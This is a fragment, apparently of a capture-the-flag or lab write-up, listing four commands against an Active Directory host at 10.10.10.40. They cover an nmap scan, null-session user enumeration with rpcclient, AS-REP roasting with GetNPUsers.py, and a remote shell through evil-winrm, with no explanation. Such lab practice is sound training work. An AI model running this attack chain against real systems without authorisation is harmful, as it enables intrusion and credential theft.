...
```bash
nmap -sC -sV -p- -T4 -oN nmap.txt 10.10.10.40
```
...
```bash
rpcclient -U "" -N 10.10.10.40 -c "enumdomusers"
```
...
```bash
GetNPUsers.py -dc-ip 10.10.10.40 -no-pass -usersfile users.txt domains/
```
...
```bash
evil-winrm -i 10.10.10.40 -u username -p password
```
